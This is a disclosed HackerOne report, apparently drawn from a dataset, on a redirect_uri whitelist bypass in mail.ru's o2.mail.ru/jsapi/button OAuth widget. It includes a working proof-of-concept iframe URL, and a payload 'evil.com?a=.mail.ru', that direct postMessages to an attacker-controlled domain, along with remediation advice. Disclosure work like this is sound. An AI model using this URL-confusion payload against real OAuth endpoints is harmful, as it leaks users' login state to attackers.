---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '341925'
original_report_id: '341925'
title: invalid handling of redirect_uri at o2.mail.ru/jsapi/button
weakness: Improper Access Control - Generic
team_handle: mailru
created_at: '2018-04-23T06:59:52.847Z'
disclosed_at: '2018-05-22T15:10:08.293Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
asset_identifier: o2.mail.ru
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# invalid handling of redirect_uri at o2.mail.ru/jsapi/button

## Metadata

- HackerOne Report ID: 341925
- Weakness: Improper Access Control - Generic
- Program: mailru
- Disclosed At: 2018-05-22T15:10:08.293Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

o2.mail.ru/jsapi/button gets embedded as login window in website that using o2 oauth. parameter redirect_uri by default may have either value of white listed domain from particular app by clientId either it may lead to *.mail.ru, then it contacts with parent window via postmessages. Other domains as value of redirect_uri resulting 403. The way /jsapi/button counts *.mail.ru as a whitelisted domain for redirect_uri is dangerous because it may be used bypass 403 to other domains like in this example:

redirect_uri=evil.com?a=.mail.ru , then button will send postmessages to evil.com with **any client Id**

Domain, site, application
--
o2.mail.ru/jsapi/button

Steps to reproduce
--
1. <iframe src="https://o2.mail.ru/jsapi/button?client_id=de6cefc49cbc44eea5a5a65e8de15b88&redirect_uri=https://notmail.com?a=.mail.ru&ui=login_as%20userpic"> 
2. replace client_id for id of your application

Actual results
--
PostMessages will be sent to attacker controlled domain. Currently there is only info may be stolen about is victim logged in for specific client id or not, but if you will extend button possibilities in future this may cause a risk for oauth implementation.

Expected results, security impact description and recommendations
--
validate subdomain part for "?" "#" "@" and other url confusing symbols when redirect uri is pointing to mail.ru subdomain

PoC, exploit code, screenshots, video, references, additional resources
--
<iframe src="https://o2.mail.ru/jsapi/button?client_id=de6cefc49cbc44eea5a5a65e8de15b88&redirect_uri=https://notmail.com?a=.mail.ru&ui=login_as%20userpic">

## Impact

bypass redirect_uri whitelist of /jsapi/button

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
